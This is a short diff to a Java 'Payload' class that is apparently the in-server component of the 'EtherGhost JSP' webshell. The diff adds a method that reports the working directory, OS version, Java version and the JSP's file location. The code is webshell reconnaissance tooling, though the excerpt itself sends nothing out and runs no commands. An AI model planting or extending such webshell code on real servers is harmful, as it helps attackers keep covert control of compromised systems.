@@ -406,6 +406,21 @@ public class Payload {
         return System.getProperty("user.dir");
     }
 
+    public HashMap<String, Object> get_basicinfo() {
+        HashMap<String, Object> map = new HashMap<>();
+        map.put("current_directory", getPwd());
+        map.put("system_version", 
+            System.getProperty("os.name") + " " + System.getProperty("os.version"));
+        map.put("java_version", System.getProperty("java.version"));
+        try {
+            map.put("jsp_location", 
+                this.getClass().getProtectionDomain().getCodeSource().getLocation().getPath());
+        } catch (Exception e) {
+            map.put("jsp_location", "unknown");
+        }
+        return map;
+    }
+
     public HashMap<String, Object> ping() {
         HashMap<String, Object> map = new HashMap<>();
         map.put("name", "EtherGhost JSP");
